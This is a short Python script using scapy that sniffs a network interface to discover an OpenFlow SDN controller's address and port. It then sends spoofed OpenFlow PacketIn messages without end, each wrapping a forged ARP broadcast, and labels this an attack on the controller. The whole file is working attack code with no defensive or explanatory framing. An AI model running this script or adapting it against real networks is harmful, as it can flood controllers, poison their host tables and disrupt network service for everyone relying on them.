from scapy.all import *
import binascii,json,time,requests
from scapy.contrib.openflow3 import *
import datetime
from threading import Thread, Lock

controllerIP = None
controllerPort = None

sourceIP = "192.168.56.101"
sourcePort = 44444
##################################

def checkMessages(packet):
    global controllerIP
    global controllerPort

    if TCP in packet:
        if OFPTPacketOut in packet:
            packet.show()
            controllerIP = packet[IP].src
            controllerPort = packet[TCP].sport
            print("Controller Listening on --->  "+ controllerIP+":"+str(controllerPort))
            sys.exit()

        if OFPTPacketIn in packet:
            packet.show()
            controllerIP = packet[IP].dst
            controllerPort = packet[TCP].dport
            print("Controller Listening on --->  "+ controllerIP+":"+str(controllerPort))
            sys.exit()

#######################

def sniffPacketIn():
    sniff(filter='tcp',prn=checkMessages , iface='eth0')

thread = Thread(target=sniffPacketIn,)
thread.start()

while(controllerIP == None):
    continue


print("Building Arp Request Packet")

# create continious ARP broadcast for host1
arpPacket = \
Ether(dst="ff:ff:ff:ff:ff:ff",src="00:00:00:00:00:01")/    \
ARP(pdst="10.0.0.2", psrc="10.0.0.1",hwsrc="00:00:00:00:00:01")

arpRequest =  \
IP(dst=controllerIP,src=sourceIP)/    \
TCP(sport=sourcePort, dport=controllerPort)/    \
OFPTPacketIn(version=4,data=bytes(arpPacket))

print("Starting attack on controller "+controllerIP+":"+str(controllerPort))
arpRequest.show()
time.sleep(5)
while (True):
    send(arpRequest)


